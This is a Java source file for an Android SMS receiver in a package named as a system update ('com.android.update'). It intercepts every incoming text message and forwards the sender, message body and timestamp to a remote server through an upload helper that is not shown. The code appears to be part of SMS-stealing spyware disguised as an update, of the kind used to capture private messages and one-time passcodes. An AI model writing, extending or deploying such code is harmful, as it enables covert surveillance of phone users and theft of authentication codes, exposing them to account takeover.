package com.android.update;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

public class SmsReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d("SMS_RECEIVED", "BroadcastReceiver triggered");

        if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                        String sender = sms.getDisplayOriginatingAddress();
                        String message = sms.getMessageBody();
                        String timestamp = String.valueOf(sms.getTimestampMillis());

                        Log.d("SMS_RECEIVED", "From: " + sender + ", Message: " + message + ", Timestamp: " + timestamp);

                        // Send SMS details to your server
                        UploadHelper.sendSMSLogToServer(context, sender, message, timestamp);
                    }
                } else {
                    Log.e("SMS_RECEIVED", "PDUs is null!");
                }
            } else {
                Log.e("SMS_RECEIVED", "Bundle is null!");
            }
        }
    }
}
